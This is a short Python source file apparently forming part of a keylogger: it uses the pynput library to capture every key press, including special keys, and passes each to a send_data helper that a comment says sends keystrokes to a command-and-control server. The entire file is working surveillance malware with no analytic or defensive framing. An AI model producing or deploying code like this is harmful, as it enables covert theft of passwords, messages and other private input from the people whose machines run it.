from pynput.keyboard import Listener
from utils import send_data

def on_press(key):
    try:
        log = f"Key pressed: {key.char}"
    except AttributeError:
        log = f"Special key pressed: {key}"

    send_data(log)  # Send keystrokes to C2 server

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
